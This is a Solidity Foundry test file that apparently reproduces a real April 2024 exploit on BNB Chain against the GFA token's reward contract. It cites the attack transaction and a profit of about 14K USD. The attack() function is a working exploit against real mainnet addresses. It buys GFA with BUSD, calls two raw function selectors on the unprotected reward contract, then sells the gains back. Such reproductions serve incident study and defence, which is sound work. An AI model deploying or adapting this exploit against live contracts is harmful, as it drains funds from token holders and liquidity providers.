// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0xe15d6f7fa891c2626819209edf2d5ded6948310eaada067b400062aa022ce718
// GUY : https://x.com/ChainAegis/status/1779809931962827055
// Profit : ~14K USD

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakePair Pair = IPancakePair(0x875AC38Bc56E2c6FBEDa4354Ac085CB94d0D2D2F);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 GFA = IERC20(0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD);
    address Reward=0xbCbCb0e7E28414e084c4a40C1cCC30B75629a7DE;


    function setUp() public {
        cheats.createSelectFork("bsc", 37857763);
        deal(address(BUSD), address(this), 30*1e18);

    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "attacker balance BUSD before attack:", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
        attack();
        emit log_named_decimal_uint(
            "attacker balance BUSD after attack:", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

    function attack() public {
            BUSD.approve(address(Pair), type(uint256).max);
            BUSD.approve(address(Router), type(uint256).max);
            swap_token_to_token(address(BUSD), address(GFA), 30 ether);
            Reward.call(abi.encodeWithSelector(bytes4(0x5f7938f1), address(this),400000000 * 1e18,40000000 *1e18,12222));
            Reward.call(abi.encodeWithSelector(bytes4(0x3890ec92), 100));
            GFA.transfer(address(GFA), 10000);
            swap_token_to_token(address(GFA), address(BUSD), GFA.balanceOf(address(this)));
     
    }
        function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
       function getreserves(uint256 stepNum) public {
        console.log("Step %i", stepNum);
        (uint256 reserveIn, uint256 reserveOut,) = Pair.getReserves();
        emit log_named_decimal_uint("ReserveIn", reserveIn, 18);
        emit log_named_decimal_uint("ReserveOut", reserveOut, 18);
    }
}


